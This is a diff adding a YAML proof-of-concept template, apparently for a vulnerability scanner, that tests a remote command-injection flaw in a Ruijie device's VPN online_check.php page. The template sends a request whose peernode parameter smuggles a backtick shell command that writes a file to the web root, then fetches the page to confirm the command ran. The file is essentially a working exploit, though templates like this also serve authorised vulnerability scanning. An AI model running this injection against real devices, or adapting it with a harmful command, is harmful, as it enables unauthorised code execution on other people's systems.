@@ -1,0 +1,18 @@
+name: poc-yaml-ruijie-UAC-rce
+set:
+  rand: randomLowercase(32)
+rules:
+  - method: GET
+    path: "/view/vpn/autovpn/online_check.php"
+    expression: |
+      response.status == 200
+  - method: GET
+    path: "/view/vpn/autovpn/online_check.php?peernode= | `echo {{rand}} > test.php`"
+    expression: |
+      response.status == 200
+  - method: GET
+    path: '/view/vpn/autovpn/'
+    expression: |
+      response.status == 200 && response.body.bcontains(b'{{rand}}')
+detail:
+  author: 666
